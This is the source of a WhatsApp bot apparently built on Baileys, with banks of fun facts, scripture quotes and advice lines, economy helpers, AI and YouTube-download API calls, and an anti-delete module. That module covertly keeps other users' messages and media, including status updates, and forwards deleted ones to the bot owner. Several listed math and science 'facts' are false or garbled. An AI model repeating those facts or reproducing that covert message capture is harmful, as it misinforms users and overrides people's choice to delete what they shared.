// ===== COPY FROM HERE - TOP DATA BANKS WITH EXACT COUNTS =====
const planetsData = [

{name:"Io",desc:"Volcanic moon of Jupiter. You are intense and erupt with ideas."},
{name:"Ganymede",desc:"Largest moon in the solar system. You take up space proudly."},
{name:"Callisto",desc:"Scarred ancient moon. You survived and still shine."},
{name:"Enceladus",desc:"Icy jets of water. You hide oceans of talent."},
{name:"Triton",desc:"Retrograde moon of Neptune. You move against the crowd wisely."},

{name:"Mercury",desc:"Smallest planet, no atmosphere. Temps -180C to 430C. You are fast and adapt quickly."},
{name:"Venus",desc:"Hottest planet, thick CO2 clouds, 90x pressure. You are beautiful but dangerous."},
{name:"Earth",desc:"Only planet with life, 71% water. You are balanced and full of life."},
{name:"Mars",desc:"Red planet, Olympus Mons biggest volcano. You are adventurous and bold."},
{name:"Jupiter",desc:"Giant gas king, Great Red Spot 400 years. You are big and protective."},
{name:"Saturn",desc:"Ringed beauty of ice and rock. You are stylish and unique."},
{name:"Uranus",desc:"Sideways ice giant, rotates on side. You are weird but cool."},
{name:"Neptune",desc:"Deep blue, 1200mph winds. You are mysterious and deep."},
{name:"Pluto",desc:"Dwarf but big heart. You are underestimated but loved."},
{name:"Kepler-452b",desc:"Earth's cousin 1400 light years away. You are hopeful dreamer."},
{name:"Proxima b",desc:"Closest exoplanet 4.2 light years. You are close to success."},
{name:"TRAPPIST-1e",desc:"Possibly habitable, 39 light years. You have potential."},
{name:"Kepler-22b",desc:"First habitable zone planet found. You are pioneer."},
{name:"Gliese 667Cc",desc:"Super-Earth 22 light years. Stronger than you look."},
{name:"HD 209458b",desc:"Osiris evaporating atmosphere. You are dramatic."},
{name:"51 Eridani b",desc:"Young Jupiter-like 96 light years. You are young and fresh."},
{name:"WASP-12b",desc:"Hot Jupiter being eaten by star. You give too much."},
{name:"Kepler-10b",desc:"Lava world iron planet. You are tough and unbreakable."},
{name:"Tatooine",desc:"Star Wars twin suns desert. You are legendary."},
{name:"Pandora",desc:"Avatar moon glowing jungle. You are magical."},
{name:"Krypton",desc:"Superman home strong gravity. You are super powerful."},
{name:"Namek",desc:"Dragon Ball green planet wise people. You are wise."},
{name:"Arrakis",desc:"Dune desert spice planet. You are valuable and dangerous."},
{name:"Coruscant",desc:"City planet Star Wars capital. You are busy important."},
{name:"Cybertron",desc:"Transformers metal planet. You are smart mechanical."},
{name:"Gallifrey",desc:"Doctor Who time lord home. You are timeless ancient."},
{name:"Vulcan",desc:"Star Trek logical planet. You are logical smart."},
{name:"Ego",desc:"Living planet Guardians. You are self-made."},
{name:"Titan",desc:"Saturn moon with lakes like Earth. Similar but different."},
{name:"Europa",desc:"Jupiter icy moon with ocean. You hide deep secrets."},
];

const galaxiesData = [
"Andromeda Galaxy - Closest spiral 2.5M light years, will collide with us. You are destined for greatness.",
"Milky Way Galaxy - Our home 100B stars 100k light years. You are home to many.",
"Triangulum Galaxy - Third largest in Local Group. You are humble but important.",
"Whirlpool Galaxy - Perfect spiral interacting. You are beautiful and social.",
"Sombrero Galaxy - Hat shaped bright core. You are stylish and bright.",
"Black Eye Galaxy - Dark dust band. You have dark past but mysterious.",
"Pinwheel Galaxy - Face-on spiral huge. You are open big hearted.",
"Cartwheel Galaxy - Ring shape from collision. You survived trauma.",
"Tadpole Galaxy - Long tail 280k light years. You leave impact.",
"Sunflower Galaxy - Flocculent spiral. You are gentle calm.",
"Messier 87 Galaxy - Giant elliptical black hole photo. You are powerful heavy.",
"Cigar Galaxy - Starburst forming stars fast. You are energetic.",
"Bode's Galaxy - Bright spiral near Big Dipper. Easy to love.",
"Circinus Galaxy - Seyfert with black hole. You hide power inside.",
"Comet Galaxy - 3.2B light years 6000 light year tail. You move fast.",
"Hoag's Object - Perfect ring galaxy rare. You are rare perfect.",
"Condor Galaxy - Largest spiral known. Larger than life.",
"Mayall's Object - Two colliding galaxies. Combination of two souls.",
"Antennae Galaxies - Two colliding forming new stars. You create from chaos.",
"Butterfly Galaxies - Colliding pair. You are transforming.",
"Mice Galaxies - Long tails like mice. You are playful.",
"Eyes Galaxies - Two galaxies like eyes. You watch everything.",
"Rose Galaxies - Rose shaped interacting. You are romantic.",
"Hockey Stick Galaxy - Warped spiral. Bent but not broken.",
"Needle Galaxy - Edge-on thin spiral. Sharp and focused.",
"Silver Dollar Galaxy - Bright round. Rich and valuable.",
"Sculptor Galaxy - Starburst spiral. You are creative.",
"Centaurus A Galaxy - Elliptical with dust lane. Mixed and unique.",
"Messier 82 Galaxy - Most active star forming. Super active.",
"Fireworks Galaxy - Lots of supernovas. Explosive and fun.",
];

const bibleQuotes = [
"Philippians 4:13 - I can do all things through Christ who strengthens me.",
"Jeremiah 29:11 - For I know the plans I have for you, declares the Lord.",
"Isaiah 41:10 - Fear not, for I am with you; be not dismayed.",
"Romans 8:28 - All things work together for good for those who love God.",
"Psalm 23:1 - The Lord is my shepherd; I shall not want.",
"Joshua 1:9 - Be strong and courageous. Do not be afraid.",
"Proverbs 3:5-6 - Trust in the Lord with all your heart.",
"2 Corinthians 12:9 - My grace is sufficient for you.",
"Psalm 46:1 - God is our refuge and strength.",
"Romans 8:31 - If God is for us, who can be against us?",
"John 3:16 - For God so loved the world He gave His only Son.",
"Isaiah 40:31 - Those who wait on the Lord shall renew their strength.",
"Philippians 4:6 - Be anxious for nothing, but in everything by prayer.",
"Psalm 27:1 - The Lord is my light and my salvation.",
"Matthew 11:28 - Come to me all who are weary and I will give you rest.",
"Deuteronomy 31:6 - Be strong and courageous, the Lord goes with you.",
"Romans 15:13 - May the God of hope fill you with joy and peace.",
"Psalm 34:8 - Taste and see that the Lord is good.",
"2 Timothy 1:7 - God has not given us a spirit of fear.",
"Isaiah 43:2 - When you pass through waters, I will be with you.",
"Psalm 37:4 - Delight yourself in the Lord and He will give you desires.",
"Matthew 6:33 - Seek first His kingdom and all will be added.",
"Psalm 46:10 - Be still and know that I am God.",
"Proverbs 18:10 - The name of the Lord is a strong tower.",
"John 14:27 - Peace I leave with you, My peace I give to you.",
"Psalm 121:2 - My help comes from the Lord.",
"Isaiah 54:17 - No weapon formed against you shall prosper.",
"Romans 12:2 - Be transformed by renewing of your mind.",
"Psalm 118:24 - This is the day the Lord has made, rejoice.",
"Jeremiah 33:3 - Call to Me and I will answer you.",
"Matthew 19:26 - With God all things are possible.",
"Psalm 56:3 - When I am afraid, I put my trust in You.",
"Isaiah 26:3 - You will keep in perfect peace whose mind is steadfast.",
"1 Peter 5:7 - Cast all your anxiety on Him because He cares.",
"Psalm 62:1 - My soul finds rest in God alone.",
"John 16:33 - In world you will have trouble. But take heart! I have overcome.",
"Romans 5:8 - God demonstrates His love for us while we were still sinners.",
"Psalm 91:1 - He who dwells in shelter of Most High will rest.",
"Philippians 4:7 - And the peace of God will guard your hearts.",
"Isaiah 40:29 - He gives strength to the weary.",
"Psalm 19:14 - May words of my mouth be pleasing to You.",
"Matthew 5:9 - Blessed are the peacemakers.",
"2 Corinthians 5:7 - We live by faith, not by sight.",
"Psalm 34:17 - The righteous cry out and Lord hears them.",
"Galatians 5:22 - Fruit of Spirit is love, joy, peace.",
"Psalm 16:8 - I have set the Lord always before me.",
"Romans 10:9 - If you confess Jesus is Lord you will be saved.",
"Isaiah 12:2 - Surely God is my salvation, I will trust.",
"Psalm 139:14 - I am fearfully and wonderfully made.",
"John 8:12 - I am the light of the world.",
"Psalm 73:26 - My flesh and heart may fail, but God is strength.",
"Matthew 5:14 - You are the light of the world.",
"Isaiah 41:13 - I am Lord your God who takes hold of your right hand.",
"Psalm 18:2 - The Lord is my rock, my fortress.",
"1 Corinthians 10:13 - No temptation beyond what you can bear.",
"Psalm 27:14 - Wait for the Lord; be strong and take heart.",
"John 15:5 - I am the vine, you are the branches.",
"Isaiah 61:1 - Spirit of Lord is on me to bring good news.",
"Psalm 94:19 - When anxiety was great, Your consolation brought joy.",
"Romans 8:18 - Present sufferings not worth comparing to glory to be revealed.",
];

const quranQuotes = [
"Indeed, with hardship will be ease. Quran 94:6",
"Allah does not burden a soul beyond that it can bear. 2:286",
"So remember Me; I will remember you. 2:152",
"And He found you lost and guided you. 93:7",
"Whoever puts trust in Allah, He will suffice him. 65:3",
"And Allah is the best of planners. 3:54",
"Indeed Allah is with the patient. 2:153",
"Call upon Me, I will respond to you. 40:60",
"And Allah loves those who do good. 2:195",
"Indeed, Allah forgives all sins. 39:53",
"And whoever fears Allah, He will make a way out. 65:2",
"So verily, with every difficulty there is relief. 94:5",
"Allah is the Light of heavens and earth. 24:35",
"And We created man in best stature. 95:4",
"Verily, in remembrance of Allah do hearts find rest. 13:28",
"And Allah would not punish them while they seek forgiveness. 8:33",
"My mercy encompasses all things. 7:156",
"Allah loves those who trust Him. 3:159",
"Do not despair of Allah's mercy. 39:53",
"And He is with you wherever you are. 57:4",
"Indeed, Allah is Forgiving and Merciful. 2:173",
"And rely upon Allah, sufficient is Allah as disposer. 33:3",
"Allah knows what is in your hearts. 33:51",
"And whoever is grateful, his gratitude is for himself. 27:40",
"Allah will bring ease after hardship. 65:7",
"So be patient, indeed Allah's promise is true. 30:60",
"Allah does not wrong people at all. 10:44",
"And Allah loves the doers of justice. 60:8",
"Indeed Allah loves those who purify themselves. 2:222",
"And Allah is ever Knowing and Wise. 4:26",
"Verily, Allah loves those who rely on Him. 3:159",
"And Allah will not waste reward of doers of good. 12:56",
"Allah is sufficient as a witness. 48:28",
"And Allah is ever Merciful to believers. 33:43",
"Indeed Allah is Gentle and Merciful. 22:65",
"And Allah guides whom He wills to straight path. 2:213",
"Allah is the Protector of those who believe. 2:257",
"And Allah is All-Hearing, All-Knowing. 2:181",
"So seek forgiveness and He will send rain. 71:10",
"Allah loves those who are constantly repentant. 2:222",
"And Allah is the best of providers. 62:11",
"Indeed, Allah's help is near. 2:214",
"And Allah is swift in account. 2:202",
"Allah will not change condition until they change themselves. 13:11",
"And Allah loves the patient. 3:146",
"Verily, Allah is with those who fear Him. 16:128",
"And Allah is Ever-Living, does not die. 25:58",
"Allah created death and life to test you. 67:2",
"And Allah is the best to take care. 12:64",
"Indeed, Allah's mercy is near to doers of good. 7:56",
"And Allah is All-Powerful over everything. 2:284",
"Allah will exalt those who believe. 58:11",
"And Allah is the One who gives life and causes death. 44:8",
"Indeed, Allah is All-Forgiving, Most Merciful. 39:53",
"And Allah loves those who are fair. 49:9",
"Allah is the Creator of all things. 39:62",
"And Allah is ever Appreciative and Knowing. 64:17",
"Indeed, Allah does not like the arrogant. 16:23",
"And Allah guides to His Light whom He wills. 24:35",
"Allah is the Truth and His promise is truth. 31:30",
];

const advices = [
"Don't chase people. Be yourself and your people will find you.",
"Take care of your body, it's the only place you have to live.",
"Learn to say NO without explaining yourself.",
"Invest in yourself, it pays the best interest.",
"Consistency beats motivation every time.",
"Your mental health is more important than any job.",
"Stop comparing your life to others' highlight reels.",
"Learn to be alone, it makes you stronger.",
"Don't be afraid to start over, it's a chance to build better.",
"Kindness is free, sprinkle it everywhere.",
"Save 20% of everything you earn.",
"Read 10 pages everyday, it changes your brain.",
"Never beg for love, respect or attention.",
"Time heals almost everything, give it time.",
"Don't take criticism from someone you wouldn't take advice from.",
"Wake up early, you get more life.",
"Forgive but never forget the lesson.",
"Be the energy you want to attract.",
"Your future needs you, your past doesn't.",
"Don't tell people your plans, show them your results.",
"Learn a high income skill every 6 months.",
"Family is not always blood, it's who is there for you.",
"Don't argue with fools, people may not see difference.",
"Take risks while you are young.",
"Listen more than you talk.",
"Don't trust words, trust actions.",
"Keep your circle small and private.",
"Never sacrifice your peace for anyone.",
"Discipline is choosing between what you want now and what you want most.",
"Help others even when you are struggling.",
"Don't gossip, it says more about you than them.",
"Embrace failure, it's a teacher.",
"Never go back to what broke you.",
"Your phone is stealing your dreams, limit it.",
"Be patient, good things take time.",
"Don't fear change, fear staying same.",
"Learn to love the process, not just result.",
"Make your parents proud before they are gone.",
"Pray, even when you don't feel like it.",
"Don't let social media define your worth.",
"Take care of your environment, it takes care of you.",
"Learn to apologize sincerely.",
"Don't be jealous, be inspired.",
"Celebrate small wins.",
"Never stop learning, life never stops teaching.",
"Control your emotions or they will control you.",
"Be loyal to those who are loyal to you.",
"Don't lend money you can't afford to lose.",
"Travel when you can, money returns, time doesn't.",
"Be careful who you trust, salt and sugar look same.",
"Don't be available all the time, have boundaries.",
"Your attitude determines your direction.",
"Work hard in silence, let success make noise.",
"Don't worry about what you can't control.",
"Learn to cook, it saves money and is attractive.",
"Dress well, people judge by appearance first.",
"Keep promises, especially to yourself.",
"Don't make permanent decisions on temporary emotions.",
"Learn to manage money, school won't teach you.",
"Be grateful daily, it changes everything.",
"Don't be a people pleaser, you will lose yourself.",
"Take responsibility for your life, no more blaming.",
"Learn to listen to your gut feeling.",
"Don't be afraid to be different, original is valuable.",
"Focus on one thing at a time for better results.",
"Learn to let go of what no longer serves you.",
"Your character is who you are when no one watches.",
"Don't complain, work harder.",
"Be kind to yourself, you are doing your best.",
"Learn to sell, everything is selling.",
"Don't watch news too much, it's negative.",
"Surround yourself with people better than you.",
"Don't waste energy on revenge, move on.",
"Take photos but live in moment too.",
"Learn to say I love you more often.",
"Don't be lazy, laziness kills dreams.",
"Be proactive not reactive.",
"Learn to fix basic things yourself.",
"Don't overshare, privacy is power.",
"Be optimistic, it makes life better.",
"Learn to rest, not to quit.",
"Be present. Yesterday is gone and tomorrow is not promised.",
"Protect your energy like your life depends on it.",
"Small daily habits beat rare big efforts.",
"Silence is sometimes the best answer.",
"Build skills that make you hard to replace.",
"Stay humble when you win, stay hopeful when you lose.",
"Your circle should push you up, not pull you down.",
"Rest is productive when you have been grinding.",
"Speak less about plans and show more results.",
"Do not argue with people committed to misunderstanding you.",
"Save before you spend, learn before you leap.",
"Kindness costs nothing and returns everything.",
"Discipline is self-respect in action.",
"Stop rehearsing your pain; rewrite your story.",
"Move in silence until your success makes noise.",
"Choose peace over proving a point.",
"Invest in people who invest in you.",
"Failure is feedback, not a full stop.",
"Your vibe attracts your tribe.",
"Start now. Perfect is a trap.",
];

const mathFacts = [
"Zero is the only number that cannot be represented in Roman numerals.",
"A googol is 10^100, but googolplex is 10^googol bigger than atoms in universe.",
"111,111,111 x 111,111,111 = 12,345,678,987,654,321",
"0.999... is exactly equal to 1, not almost 1.",
"There are more possible chess games than atoms in observable universe.",
"12+3-4+5+67+8+9 = 100 and uses numbers 1-9 in order.",
"Number 8 turned 90 degrees is infinity symbol.",
"Every odd number has an 'e' in its English spelling.",
"4 is only number spelled with same letters as its value (four).",
"13 unlucky because 13 people at Last Supper before Jesus betrayal.",
"Number 9 magic: Multiply any number by 9, sum digits = 9.",
"A circle has infinite lines of symmetry.",
"Pythagoras theorem has 370+ different proofs.",
"From 0 to 1000, letter 'a' appears first in one thousand.",
"40 is only number with letters in alphabetical order - forty.",
"One is only number with letters in reverse alphabetical order.",
"Abacus is still used and faster than calculator for some.",
"2 and 5 are only primes ending in 2 and 5.",
"7 is most common favourite number in world.",
"6 is smallest perfect number: divisors 1+2+3 = 6.",
"1729 is Hardy-Ramanujan number: smallest sum of 2 cubes in 2 ways.",
"Fibonacci sequence appears in sunflower, pinecones, galaxies.",
"Pi has been calculated to 100 trillion digits.",
"Zero invented in India, crucial for mathematics.",
"In a group of 23 people, 50% chance 2 share birthday.",
"Sum of angles in triangle always 180 degrees.",
"10! seconds = 6 weeks exactly: 3,628,800 seconds.",
"Binary: computer only uses 0 and 1.",
"A jiffy is actual time unit: 1/100th of second.",
"If you shuffle cards properly, order has likely never existed before.",
"Math is only subject where truth is absolute.",
"Infinity comes in different sizes - countable vs uncountable.",
"Multiplying 1089 x 9 = 9801 reverse of 1089.",
"Every even number >2 is sum of 2 primes - Goldbach conjecture.",
"Equal sign = invented 1557 by Robert Recorde tired of writing 'is equal to'.",
"Negative numbers were once called absurd numbers.",
"Google named from googol mispelling.",
"2 to power 0 is 1, any number power 0 is 1.",
"Ancient Egyptians used fractions only like 1/n.",
"Centipede has not 100 legs, can have 30 to 354 legs.",
];

const scienceFacts = [
"Water can boil and freeze at same time at 0.01C - Triple Point.",
"Light from Sun takes 8 minutes 20 seconds to reach Earth.",
"Honey never spoils, 3000 year old honey found edible.",
"Octopus has 3 hearts and 9 brains.",
"Banana is radioactive, contains potassium-40.",
"A day on Venus is longer than a year on Venus.",
"There is planet made of diamonds 2x size of Earth - 55 Cancri e.",
"Humans share 60% DNA with bananas.",
"Your stomach gets new lining every 3-4 days.",
"Eiffel Tower grows 6 inches in summer due to heat expansion.",
"Nose can smell 1 trillion different scents.",
"Space smells like seared steak and gunpowder.",
"Wombats poop cubes to mark territory.",
"Lightning is 5x hotter than surface of Sun - 30000K.",
"There are more trees on Earth than stars in Milky Way.",
"Your brain generates 20 watts power enough for dim bulb.",
"Cows have best friends and get stressed when separated.",
"Ocean has 200x more gold than mined in history.",
"Venus has 900F and rains sulfuric acid.",
"Human body has enough iron to make 3 inch nail.",
"Ants never sleep, but take 8 min rests.",
"Sun makes up 99.86% of solar system mass.",
"If you drill tunnel through Earth, 42 min to fall other side.",
"Blood makes up 8% of body weight.",
"Chewing gum after onion prevents crying.",
"Space is silent, no sound can travel.",
"Your eyes blink 28800 times a day.",
"Butterflies taste with their feet.",
"Sharks existed before trees - 400M vs 350M years.",
"Human DNA is 99% same as chimpanzee.",
"Light can be turned into matter - Breit-Wheeler.",
"Earth's core is as hot as Sun surface - 6000C.",
"Clouds can weigh million pounds but float.",
"You can't burp in space, no gravity.",
"Moon has moonquakes like earthquakes.",
"Human body glows but eyes can't see.",
"DNA can be stored for 1M years if kept cold.",
"An atom is 99.9999% empty space.",
"Sound travels 4x faster in water than air.",
"Human nose can detect 1 trillion smells but dog 1000x more.",
];

const xdeathLinks = [
  "https://files.catbox.moe/wq4ohm.jpg",
  "https://files.catbox.moe/4fzizw.jpg"
];

const bombState = new Map();

function gameUserId(m) {
    return `${m.chat}:${m.sender}`;
}
function randInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
// ========== SAVE STATUS ==========
let saveStatusMode = false;

// ========== AZA DATABASE ==========
const AZA_FILE = path.join(__dirname, './aza.json');
function loadAzaDB() {
    try {
        if (fs.existsSync(AZA_FILE)) {
            return JSON.parse(fs.readFileSync(AZA_FILE, 'utf8'));
        }
    } catch (e) { console.error('AZA load error:', e.message); }
    return {};
}
function saveAzaDB(data) {
    try {
        fs.writeFileSync(AZA_FILE, JSON.stringify(data, null, 2));
    } catch (e) { console.error('AZA save error:', e.message); }
}


const MENU_IMAGE_PATH = require('path').join(__dirname, '../media/logo.jpg');
let menuImageBuffer = null;
try {
    if (fs.existsSync(MENU_IMAGE_PATH)) {
        menuImageBuffer = fs.readFileSync(MENU_IMAGE_PATH);
    }
} catch (e) {}
global.menuImage = menuImageBuffer || 'https://files.catbox.moe/s7kl0m.jpg';

// ========== DATABASE ==========
const dbPath = DATABASE_FILE;
const legacyDbPath = path.join(process.cwd(), 'database.json');
let db;
try {
    fs.mkdirSync(STORAGE_DIR, { recursive: true });
    const source = fs.existsSync(dbPath) ? dbPath : (fs.existsSync(legacyDbPath) ? legacyDbPath : null);
    db = source ? JSON.parse(fs.readFileSync(source, 'utf8')) : null;
    if (!db || typeof db !== 'object') throw new Error('Invalid database');
    if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
} catch (err) {
    db = { users: {}, groups: {}, warns: {}, economy: {}, jailed: {}, botMode: { mode: 'public', whitelist: [] } };
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
}
if (!db.economy) db.economy = {};
if (!db.botMode) db.botMode = { mode: 'public', whitelist: [] };
if (!db.botMode.whitelist) db.botMode.whitelist = [];
if (!db.jailed) db.jailed = {};
if (!db.warns) db.warns = {};

const GEMINI_API_KEY = process.env.GEMINI_API_KEY || '';

let GoogleGenerativeAI;
try {
    const genAI = require('@google/generative-ai');
    GoogleGenerativeAI = genAI.GoogleGenerativeAI;
} catch (e) {}

// ========== AGENTROUTER (agentrouter.org) ==========
// Get your key from https://agentrouter.org/console/token and paste it below.
// Leave it as '' to skip AgentRouter and fall back straight to the free mirror APIs.
const AGENTROUTER_API_KEY = process.env.AGENTROUTER_API_KEY || '';
const AGENTROUTER_BASE_URL = 'https://agentrouter.org/v1';
const AGENTROUTER_CHAT_MODEL = 'claude-3-5-haiku-20241022';
const AGENTROUTER_DEEPSEEK_MODEL = 'deepseek-chat';

// Calls AgentRouter's OpenAI-compatible /chat/completions endpoint.
// Returns the reply text, or null if the key isn't set / the call fails.
async function askAgentRouter(prompt, model = AGENTROUTER_CHAT_MODEL) {
    if (!AGENTROUTER_API_KEY) return null;
    try {
        const res = await axios.post(
            `${AGENTROUTER_BASE_URL}/chat/completions`,
            {
                model,
                messages: [{ role: 'user', content: prompt }],
                max_tokens: 1024
            },
            {
                timeout: 30000,
                headers: {
                    Authorization: `Bearer ${AGENTROUTER_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            }
        );
        return res.data?.choices?.[0]?.message?.content?.trim() || null;
    } catch (e) {
        console.log('❌ AgentRouter failed:', e.response?.data?.error?.message || e.message);
        return null;
    }
}
// ========== HELPERS ==========
function saveDB() {
    try { fs.writeFileSync(dbPath, JSON.stringify(db, null, 2)); } catch (e) {}
}

function ensureEconomy(id) {
    if (!db.economy[id]) {
        db.economy[id] = { wallet: 1000, bank: 0, lastDaily: 0, inventory: [] };
    }
    return db.economy[id];
}

function fmtCoins(n) {
    return Number(n).toLocaleString('en-US');
}

const delay = (ms) => new Promise(r => setTimeout(r, ms));

// ========== API HELPERS ==========
async function getEliteProTechDownload(youtubeUrl) {
    const res = await axios.get(
        `https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(youtubeUrl)}&format=mp3`,
        { timeout: 60000 }
    );
    if (res?.data?.success && res?.data?.downloadURL) {
        return { download: res.data.downloadURL, title: res.data.title };
    }
    throw new Error('Failed');
}

async function getShizoDownload(youtubeUrl) {
    const res = await axios.get(
        `https://api.shizo.top/downloader/ytmp3?apikey=shizo&url=${encodeURIComponent(youtubeUrl)}`,
        { timeout: 60000 }
    );
    if (res?.data?.status && res?.data?.result?.download) {
        return { download: res.data.result.download, title: res.data.result.title };
    }
    throw new Error('Failed');
}
// ========== ANTI-DELETE STORE ==========
const antidelete = (() => {
    const messageStore = new Map();
    const DATA_DIR = path.join(process.cwd(), 'data');
    const CONFIG_PATH = path.join(DATA_DIR, 'antidelete.json');
    const TEMP_MEDIA_DIR = (require('path').join(require('os').tmpdir(), 'vico-tmp'));

    try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        if (!fs.existsSync(TEMP_MEDIA_DIR)) fs.mkdirSync(TEMP_MEDIA_DIR, { recursive: true });
    } catch (err) {}

    function loadConfig() {
        try {
            if (!fs.existsSync(CONFIG_PATH)) return { enabled: false };
            return JSON.parse(fs.readFileSync(CONFIG_PATH));
        } catch { return { enabled: false }; }
    }

    function saveConfig(config) {
        try { fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2)); } catch (err) {}
    }

    async function storeMessage(sock, message) {
        try {
            const config = loadConfig();
            if (!config.enabled) return;
            if (!message.key?.id) return;
            // Skip protocol / revoke messages themselves
            if (message.message?.protocolMessage) return;

            const messageId = message.key.id;
            const sender = message.key.participant || message.participant || message.key.remoteJid || 'Unknown';
            const chat = message.key.remoteJid || 'Unknown';
            const isStatus = chat === 'status@broadcast';

            let content = '';
            let mediaType = null;

            if (message.message?.conversation) {
                content = message.message.conversation;
            } else if (message.message?.extendedTextMessage?.text) {
                content = message.message.extendedTextMessage.text;
            } else if (message.message?.imageMessage) {
                mediaType = '🖼️ Image';
                content = message.message.imageMessage.caption || '[Image]';
            } else if (message.message?.videoMessage) {
                mediaType = '🎬 Video';
                content = message.message.videoMessage.caption || '[Video]';
            } else if (message.message?.stickerMessage) {
                mediaType = '🔖 Sticker';
                content = '[Sticker]';
            } else if (message.message?.audioMessage) {
                mediaType = message.message.audioMessage.ptt ? '🎤 Voice Note' : '🔊 Audio';
                content = `[${mediaType}]`;
            } else if (message.message?.documentMessage) {
                mediaType = '📄 Document';
                content = message.message.documentMessage.fileName || '[Document]';
            } else if (message.message?.contactMessage) {
                mediaType = '👤 Contact';
                content = '[Contact]';
            } else if (message.message?.locationMessage) {
                mediaType = '📍 Location';
                content = '[Location]';
            } else {
                content = '[Unsupported / Media]';
            }

            let mediaBuffer = null;
            let mediaMime = null;
            try {
                const msg = message.message || {};
                const node =
                    msg.imageMessage || msg.videoMessage || msg.audioMessage ||
                    msg.stickerMessage || msg.documentMessage || null;
                if (node) {
                    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
                    let dtype = 'buffer';
                    if (msg.imageMessage) { dtype = 'image'; mediaMime = msg.imageMessage.mimetype || 'image/jpeg'; }
                    else if (msg.videoMessage) { dtype = 'video'; mediaMime = msg.videoMessage.mimetype || 'video/mp4'; }
                    else if (msg.audioMessage) { dtype = 'audio'; mediaMime = msg.audioMessage.mimetype || 'audio/ogg; codecs=opus'; }
                    else if (msg.stickerMessage) { dtype = 'sticker'; mediaMime = 'image/webp'; }
                    else if (msg.documentMessage) { dtype = 'document'; mediaMime = msg.documentMessage.mimetype || 'application/octet-stream'; }
                    const stream = await downloadContentFromMessage(node, dtype);
                    const chunks = [];
                    for await (const chunk of stream) chunks.push(chunk);
                    mediaBuffer = Buffer.concat(chunks);
                    if (mediaBuffer.length > 12 * 1024 * 1024) mediaBuffer = null; // skip huge
                }
            } catch (_) {}

            messageStore.set(messageId, {
                content,
                mediaType,
                mediaBuffer,
                mediaMime,
                isPtt: !!(message.message?.audioMessage?.ptt),
                sender,
                chat,
                isStatus,
                fromMe: !!message.key.fromMe,
                timestamp: new Date().toISOString()
            });

            // Limit store size
            if (messageStore.size > 3000) {
                const keys = [...messageStore.keys()].slice(0, 1000);
                keys.forEach(k => messageStore.delete(k));
            }
        } catch (err) {}
    }

    async function handleRevocation(sock, revocationMessage) {
        try {
            const config = loadConfig();
            if (!config.enabled) return;

            const protocolMsg = revocationMessage.message?.protocolMessage;
            // type 0 = REVOKE (message deleted)
            if (!protocolMsg || protocolMsg.type !== 0) return;

            const messageId = protocolMsg.key?.id;
            if (!messageId) return;

            const deletedBy =
                revocationMessage.participant ||
                revocationMessage.key?.participant ||
                protocolMsg.key?.participant ||
                revocationMessage.key?.remoteJid;

            const original = messageStore.get(messageId);
            if (!original) return; // message not in store (old / never captured)

            // Don't report pure bot commands the user deleted
            const pureCmd = (original.content || '').trim();
            if (pureCmd && /^[.!#\/][a-z0-9]/i.test(pureCmd) && pureCmd.length < 80 && !original.mediaType) {
                return;
            }


            const sender = original.sender;
            const time = new Date().toLocaleString('en-NG', { timeZone: 'Africa/Lagos' });
            const chat = original.chat || revocationMessage.key?.remoteJid;

            let text =
                `🔰 *ANTIDELETE REPORT*\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `🗑️ *Deleted By:* @${(deletedBy || 'unknown').split('@')[0]}\n` +
                `👤 *Original Sender:* @${(sender || 'unknown').split('@')[0]}\n` +
                `🕒 *Time:* ${time}\n`;

            if (original.isStatus) text += `📌 *Type:* Status Update\n`;
            else if (chat?.endsWith('@g.us')) text += `👥 *Group:* ${chat}\n`;
            else text += `💬 *Chat:* Private\n`;

            if (original.mediaType) text += `📎 *Media:* ${original.mediaType}\n`;
            if (original.content) text += `\n💬 *Content:*\n${original.content}`;

            const mentions = [deletedBy, sender].filter(Boolean);

            // Send ONLY to bot owner DM (not the group) — text + media (image/voice/video)
            try {
                const ownerNumber = (sock.user?.id || '').split(':')[0] + '@s.whatsapp.net';
                if (ownerNumber) {
                    await sock.sendMessage(ownerNumber, {
                        text,
                        mentions
                    }).catch(() => {});
                    if (original.mediaBuffer && original.mediaBuffer.length > 50) {
                        const mime = original.mediaMime || '';
                        const buf = original.mediaBuffer;
                        try {
                            if (/image|webp|sticker/i.test(mime) || original.mediaType?.includes('Image') || original.mediaType?.includes('Sticker')) {
                                await sock.sendMessage(ownerNumber, { image: buf, caption: '📎 Recovered media' }).catch(() => {});
                            } else if (/video/i.test(mime) || original.mediaType?.includes('Video')) {
                                await sock.sendMessage(ownerNumber, { video: buf, mimetype: mime || 'video/mp4', caption: '📎 Recovered video' }).catch(() => {});
                            } else if (/audio|ptt|ogg|opus/i.test(mime) || original.mediaType?.includes('Voice') || original.mediaType?.includes('Audio')) {
                                await sock.sendMessage(ownerNumber, {
                                    audio: buf,
                                    mimetype: mime || 'audio/ogg; codecs=opus',
                                    ptt: !!original.isPtt
                                }).catch(() => {});
                            } else {
                                await sock.sendMessage(ownerNumber, {
                                    document: buf,
                                    mimetype: mime || 'application/octet-stream',
                                    fileName: 'recovered.bin'
                                }).catch(() => {});
                            }
                        } catch (me) {
                            console.error('antidelete media send:', me.message);
                        }
                    }
                }
            } catch (_) {}

            messageStore.delete(messageId);
        } catch (err) {
            console.error('Antidelete revoke error:', err.message);
        }
    }

    async function handleCommand(sock, chatId, message, match, isCreator) {
        if (!isCreator) {
            await sock.sendMessage(chatId, { 
                text: '❌ *Only the bot owner can use this command.*',
                contextInfo: newsletterContext()
            }, { quoted: message });
            return;
        }
        const config = loadConfig();
        if (!match) {
            await sock.sendMessage(chatId, {
                text: `*ANTIDELETE SETUP*\n\n📊 *Status:* ${config.enabled ? '✅ Enabled' : '❌ Disabled'}\n\n*.antidelete on* - Enable\n*.antidelete off* - Disable`,
                contextInfo: newsletterContext()
            }, { quoted: message });
            return;
        }
        if (match === 'on') { config.enabled = true; saveConfig(config); await sock.sendMessage(chatId, { text: '*✅ Antidelete enabled*', contextInfo: newsletterContext() }, { quoted: message }); }
